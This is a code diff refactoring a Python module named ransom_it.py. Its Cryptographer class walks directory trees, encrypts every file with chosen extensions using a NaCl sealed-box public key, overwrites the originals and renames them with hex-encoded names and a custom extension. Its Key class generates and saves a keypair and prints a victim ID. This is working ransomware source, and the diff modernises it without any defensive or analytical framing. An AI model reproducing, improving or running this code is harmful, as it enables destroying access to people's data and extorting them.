@@ -1,14 +1,9 @@
-"""
-
-Steps :
-# Generate random ID
-# Generate key pair from random ID
-# Encrypt data with public key
-
-"""
+"""Module for ransom_it.py"""
 
 import uuid
 import binascii
+import contextlib
+import itertools
 import os
 from pathlib import Path
 from nacl.public import SealedBox, PrivateKey
@@ -29,7 +24,7 @@ class Cryptographer:
         """
 
         # Get data from file
-        try:
+        with contextlib.suppress(FileNotFoundError):
             with open(filename, 'rb') as file:
                 data = file.read()
 
@@ -42,8 +37,6 @@ class Cryptographer:
             # Write encrypted_data to file
             with open(filename, 'wb') as file:
                 file.write(encoded_encrypted_data)
-        except FileNotFoundError:
-            pass
 
 
     ############################################
@@ -61,11 +54,9 @@ class Cryptographer:
         # Encode filename in hex value
         encoded_filename = binascii.hexlify(filename.encode())
 
-        try:
+        with contextlib.suppress(OSError):
             # Rename file
             os.rename(filename, path+b'/'+encoded_filename+str.encode(self.FILE_EXTENSION))
-        except OSError:
-            pass
 
 
     ############################################
@@ -109,14 +100,12 @@ class Cryptographer:
 
         # Encrypt and encode all files in folders with specified extensions
         for root, _, files in os.walk(path, topdown=True):
-            for filename in files:
-                # for i in range(len(extensions)):  # Verify each extension
-                for index, _value in enumerate(extensions):
-                    extension = '.'+extensions[index]
-                    if extension in filename:
-                        target = root+'/'+filename  # Write path+filename
-                        self.encrypt_data(target)  # Encrypt Data
-                        self.encode_filename(target)  # Encode Filename
+            for filename, (index, _value) in itertools.product(files, enumerate(extensions)):
+                extension = f'.{extensions[index]}'
+                if extension in filename:
+                    target = f'{root}/{filename}'
+                    self.encrypt_data(target)  # Encrypt Data
+                    self.encode_filename(target)  # Encode Filename
 
 class Key:
     """
@@ -127,7 +116,7 @@ class Key:
         self.generate_key()
         self.key_id = uuid.uuid4()
         self.write_key()
-        print("Your ID : " + str(self.key_id))
+        print(f"Your ID : {str(self.key_id)}")
 
     def generate_key(self):
         """
@@ -141,10 +130,10 @@ class Key:
         Write key values into files
         """
 
-        with open('%s_private.key' % self.key_id, 'wb') as file:
+        with open(f'{self.key_id}_private.key', 'wb') as file:
             file.write(self.private.encode())
 
-        with open('%s_public.key' % self.key_id, 'wb') as file:
+        with open(f'{self.key_id}_public.key', 'wb') as file:
             file.write(self.public.encode())
 
 
